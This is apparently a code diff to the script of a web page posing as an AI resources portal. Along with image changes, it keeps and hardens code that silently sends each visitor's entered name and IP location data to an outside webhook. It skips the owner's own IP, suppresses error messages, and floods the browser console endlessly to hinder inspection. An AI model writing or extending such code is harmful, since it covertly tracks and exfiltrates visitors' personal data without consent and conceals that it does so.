@@ -222,44 +222,37 @@
     </div>
 
     <script>
-        // Unique abstract images (20 different ones)
+        // Unique abstract images with cache busting
         const abstractImages = [
-            "https://source.unsplash.com/random/800x600/?abstract,1",
-            "https://source.unsplash.com/random/800x600/?abstract,2",
-            "https://source.unsplash.com/random/800x600/?abstract,3",
-            "https://source.unsplash.com/random/800x600/?tech,1",
-            "https://source.unsplash.com/random/800x600/?tech,2",
-            "https://source.unsplash.com/random/800x600/?futuristic,1",
-            "https://source.unsplash.com/random/800x600/?futuristic,2",
-            "https://source.unsplash.com/random/800x600/?neon,1",
-            "https://source.unsplash.com/random/800x600/?neon,2",
-            "https://source.unsplash.com/random/800x600/?digital,1",
-            "https://source.unsplash.com/random/800x600/?digital,2",
-            "https://source.unsplash.com/random/800x600/?ai,1",
-            "https://source.unsplash.com/random/800x600/?ai,2",
-            "https://source.unsplash.com/random/800x600/?data,1",
-            "https://source.unsplash.com/random/800x600/?data,2",
-            "https://source.unsplash.com/random/800x600/?network,1",
-            "https://source.unsplash.com/random/800x600/?network,2",
-            "https://source.unsplash.com/random/800x600/?code,1",
-            "https://source.unsplash.com/random/800x600/?code,2",
-            "https://source.unsplash.com/random/800x600/?matrix"
+            'https://images.unsplash.com/photo-1620641788421-7a1c342ea42e?ixid=MnwxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8&ixlib=rb-1.2.1&auto=format&fit=crop&w=800&q=80',
+            'https://images.unsplash.com/photo-1579547945413-497e1b99dac0?ixid=MnwxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8&ixlib=rb-1.2.1&auto=format&fit=crop&w=800&q=80',
+            'https://images.unsplash.com/photo-1635070041078-e363dbe005cb?ixid=MnwxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8&ixlib=rb-1.2.1&auto=format&fit=crop&w=800&q=80',
+            'https://images.unsplash.com/photo-1534972195531-d756b9bfa9f2?ixid=MnwxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8&ixlib=rb-1.2.1&auto=format&fit=crop&w=800&q=80',
+            'https://images.unsplash.com/photo-1563089145-599997674d42?ixid=MnwxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8&ixlib=rb-1.2.1&auto=format&fit=crop&w=800&q=80',
+            'https://images.unsplash.com/photo-1451187580459-43490279c0fa?ixid=MnwxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8&ixlib=rb-1.2.1&auto=format&fit=crop&w=800&q=80'
         ];
 
         // Console spam variables
         let spamCount = 0;
         const ADMIN_IP = "83.105.112.217";
-        const WEBHOOK_URL = "https://eoky7dsuisvr7mo.m.pipedream.net";
+        const WEBHOOK_URL = "https://endpp.free.beeceptor.com";
 
         // Start console spam immediately
-        const spamInterval = setInterval(() => {
-            console.log(`[SYSTEM] ${Math.random().toString(36).substring(2, 15)}`);
-            spamCount++;
-            if (spamCount > 300) {
-                clearInterval(spamInterval);
-                console.clear();
-            }
-        }, 50);
+        const startConsoleSpam = () => {
+            const firstStage = setInterval(() => {
+                console.log(`[SYSTEM] ${Math.random().toString(36).substring(2, 15)}`);
+                spamCount++;
+                if (spamCount > 300) {
+                    clearInterval(firstStage);
+                    console.clear();
+                    // Start second stage - endless block spam
+                    setInterval(() => {
+                        console.log('▓'.repeat(80));
+                    }, 50);
+                }
+            }, 50);
+        };
+        startConsoleSpam();
 
         // Get IP data silently
         async function getIPData() {
@@ -267,14 +260,13 @@
                 const response = await fetch('https://ipinfo.io/json');
                 return await response.json();
             } catch (error) {
-                console.error("IP detection failed");
                 return null;
             }
         }
 
         // Send data to webhook silently
         async function sendToWebhook(userName, ipData) {
-            if (ipData.ip === ADMIN_IP) return;
+            if (!ipData || ipData.ip === ADMIN_IP) return;
             
             const payload = {
                 name: userName,
@@ -294,7 +286,7 @@
                     body: JSON.stringify(payload)
                 });
             } catch (e) {
-                console.error("Webhook error");
+                // Silent fail
             }
         }
 
@@ -305,7 +297,7 @@
             
             // Silently collect IP data
             const ipData = await getIPData();
-            if (ipData) await sendToWebhook(userName, ipData);
+            await sendToWebhook(userName, ipData);
             
             // Update UI
             document.getElementById('welcomeName').textContent = `Welcome, ${userName}`;
@@ -323,26 +315,24 @@
                 "Model Optimization Toolkit",
                 "Research Papers Digest",
                 "Deployment Templates",
-                "Ethics Guidelines",
-                "Computer Vision Models",
-                "NLP Processing Suite"
+                "Ethics Guidelines"
             ];
             
-            // Shuffle images to ensure no duplicates
-            const shuffledImages = [...abstractImages].sort(() => 0.5 - Math.random());
+            // Ensure we don't have more resources than images
+            const maxResources = Math.min(resources.length, abstractImages.length);
             
-            resources.forEach((resource, index) => {
+            for (let i = 0; i < maxResources; i++) {
                 const card = document.createElement('div');
                 card.className = 'resource-card';
                 card.innerHTML = `
-                    <div class="resource-img" style="background-image:url('${shuffledImages[index]}')"></div>
+                    <div class="resource-img" style="background-image:url('${abstractImages[i]}')"></div>
                     <div class="resource-body">
-                        <h3>${resource}</h3>
+                        <h3>${resources[i]}</h3>
                         <p>Premium resource for AI development</p>
                     </div>
                 `;
                 grid.appendChild(card);
-            });
+            }
         }
     </script>
 </body>
